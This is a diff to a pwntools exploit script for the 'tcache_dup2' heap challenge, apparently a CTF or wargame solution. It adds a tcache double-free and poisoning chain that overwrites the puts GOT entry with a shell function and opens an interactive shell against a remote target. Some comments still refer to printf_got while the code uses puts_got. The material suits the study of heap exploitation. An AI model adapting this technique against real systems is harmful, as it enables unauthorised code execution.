@@ -1,6 +1,8 @@
 from pwn import *
 
-LOCAL = True
+#context.log_level = "debug"
+
+LOCAL = False
 if LOCAL:
     p = process("./tcache_dup2")
 else:
@@ -16,7 +18,7 @@ def slog(name, addr):
 def create(size, data):
     p.sendlineafter("> ", b"1")
     p.sendlineafter("Size: ", str(size))
-    p.sendafter("Data: ", data)
+    p.sendlineafter("Data: ", data)
 
 
 def modify(idx, size, data):
@@ -28,22 +30,31 @@ def modify(idx, size, data):
 
 def delete(idx):
     p.sendlineafter("> ", b"3")
-    p.sendafter("idx: ", str(idx))
+    p.sendlineafter("idx: ", str(idx))
 
 
 elf = ELF("./tcache_dup2")
 libc = ELF("./libc-2.30.so")
 
 get_shell = elf.symbols["get_shell"]
-printf_got = elf.got["printf"]
+puts_got = elf.got["puts"]
+# system func must work with 0x10-step instruction.
 
 # [1] Tcache Duplication Considering Chunk Count
-create(0x10, b"dreamhack")  # idx: 0
-create(0x10, b"tcachedup")  # idx: 1
-delete(1)
-delete(0)
-modify(0, 0x10, b"A" * 8 + b"\x00")
-delete(0)
+create(0x10, b"AAAA")  # idx: 0
+create(0x10, b"BBBB")  # idx: 1
+create(0x10, b"CCCC")  # idx: 2
+delete(0)                   # stack: (bottom) 0
+delete(1)                   # stack: (bottom) 0 -> 1
+modify(1, 0x10, b"A" * 8 + b"ABCDEFGH")
+delete(1)                   # stack: (bottom) 0 -> 1 -> 1
+# count: 3
 
-gdb.attach(p)
-# [2]
+# [2] Tcache Poisoning
+# stack: (bottom) 0 -> printf_got -> 1, count: 2
+create(0x10, p64(puts_got))
+# stack: (bottom) 0 -> printf_got, count: 1
+create(0x10, b'BBBB')
+create(0x10, p64(get_shell))        # stack: (bottom) 0, count: 0
+
+p.interactive()
